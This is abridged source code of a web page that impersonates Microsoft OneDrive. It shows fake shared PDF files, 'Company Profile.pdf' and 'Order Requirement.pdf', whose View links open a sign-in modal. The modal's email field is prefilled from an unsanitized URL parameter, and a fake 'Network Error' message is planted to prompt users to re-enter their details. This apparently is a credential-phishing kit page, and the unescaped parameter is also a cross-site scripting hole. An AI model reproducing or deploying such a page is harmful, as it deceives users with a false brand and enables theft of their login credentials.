...
<title>OneDrive - Download files</title>
  ...
  <body class="bg-light" style="">
        ...
        <div class="col-sm-12 col-md-9">
          <!-- Caption Area -->
            ...
            <div class="my-3 p-3 bg-white rounded box-shadow">
              ...
              <div class="media text-muted pt-3"><img srcset="https://img.icons8.com/color/2x/pdf-2.png 2x" alt="PDF icon" loading="lazy">
                <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
                  <div class="d-flex justify-content-between align-items-center w-100">
                    <strong>Company Profile.pdf</strong>
                    <a href="#" data-toggle="modal" data-target="#myModal">View</a>                </div>
          ...
          <div class="media text-muted pt-3"><img srcset="https://img.icons8.com/color/2x/pdf-2.png 2x" alt="PDF icon" loading="lazy">
            <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
              <div class="d-flex justify-content-between align-items-center w-100">
                <strong>Order Requirement.pdf</strong>
                <a href="#" data-toggle="modal" data-target="#myModal">View</a>              </div>
    ...
    <footer class="footer">
      <div class="container">
        <span class="text-muted" style="font-size: 13px;">© Microsoft 2022.</span>      </div>
    </footer>
        ...
        <!-- Second Modal Content -->
            <div id="second-view" class="modal-content">
              ...
              <form>
                  ...
                  <div class="alert alert-danger" id="serverResponse" style="display: none;">Network Error! Please verify your information and try again</div>

                  <div class="form-group">
                    <label for="exampleInputEmail1"> Email address</label>
                    <input type="email" id="um" value="<?=$_GET[email]?>" class="form-control" aria-describedby="emailHelp" placeholder="Receiver&#39;s Enter email">
              ...
              <div><small style="font-size:10px;">All rights reserved. ©Microsoft 2021</small></div>
